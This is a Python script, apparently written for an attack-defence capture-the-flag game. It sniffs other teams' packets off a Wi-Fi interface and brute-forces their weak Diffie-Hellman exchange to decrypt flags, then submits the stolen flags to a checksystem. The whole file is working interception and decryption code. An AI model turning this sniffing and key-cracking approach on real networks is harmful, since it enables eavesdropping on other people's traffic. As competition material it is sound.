#!/usr/bin/env python3
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from os import environ
from sys import argv
from scapy.layers.l2 import LLC
from multiprocessing import Pool, log_to_stderr
from socket import socket

logger = log_to_stderr()
logger.setLevel(logging.WARNING)

__author__ = 'm_messiah'

PORT = 27000
MY_TEAM = int(environ.get('TEAM_ID', 101))
IFACE = environ.get('WIFICARD', 'wlan0')


class Env(Packet):
    fields_desc = [
        IntField('decoded', 31337),
        IntField('stream', 0),
        IntField('cmd', 0),
        IntField("team_id", 0),
        FieldLenField("len", None, length_of="data"),
        StrLenField("data", "", length_from=lambda pkt: pkt.len),
        FieldLenField("len_sign", None, length_of="sign"),
        StrLenField("sign", "", length_from=lambda pkt: pkt.len_sign),
    ]

bind_layers(LLC, Env, ssap=0)


def is_env(pkt):
    if pkt.haslayer(Env):
        if pkt.decoded == 31337 and pkt.team_id != MY_TEAM:
            return True
    return False


def crack_dh(data):
    secret, s = 1, 1
    # logger.warning(data)  # to handle in another computer
    for i in range(data['p']):
        s = (s * data['g']) % data['p']
        if s == data['A']:
            secret = pow(data['B'], i + 1, data['p'])
            break
        if s == data['B']:
            secret = pow(data['A'], i + 1, data['p'])
            break

    message = int(data['data'] // secret).to_bytes(
        300, byteorder='big').strip(b'\0')
    if b'put:' not in message:
        return
    flag = message.split(b'put:')[1]
    answer = b""
    try:
        conn.send(flag + b'\n')
        answer = conn.recv(256)
    except Exception as e:
        logger.error(e)
    if b'no such flag' in answer:
        time.sleep(10)
        try:
            conn.send(flag + b'\n')
            answer = conn.recv(256)
        except Exception as e:
            logger.error(e)
    logger.warning(answer.decode("utf8").strip())


def handle(pkt):
    pkt_session = "%s:%s" % (pkt.team_id, pkt.stream)
    if pkt_session in sessions:
        session = sessions[pkt_session]
        if pkt.cmd == 0:
            return
        elif pkt.cmd == 1:
            if 'B' in session:
                return
            data = int(pkt.data).to_bytes(
                300, byteorder='big').strip(b'\0')
            if b'pub:' not in data:
                return
            sessions[pkt_session]['B'] = int(data.split(b'pub:')[1])
            return
        elif pkt.cmd == 2:
            session['data'] = int(pkt.data)
            pool.apply_async(crack_dh, [session])
            del sessions[pkt_session]
            return
        else:
            return
    else:
        if pkt.cmd == 0:
            data = int(int(pkt.data)).to_bytes(
                300, byteorder='big').strip(b'\0')
            if b'start:' not in data:
                return
            sessions[pkt_session] = dict(zip(
                ['p', 'g', 'A'],
                map(int, data.split(b':')[1:4]))
            )
        return

if __name__ == '__main__':
    if len(argv) > 1:
        checksystem = argv[1]
        conn = socket()
        conn.connect((checksystem, 31337))
        conn.recv(256)
        sessions = dict()
        pool = Pool(processes=10)
        sniff(iface=IFACE, lfilter=is_env, prn=handle)
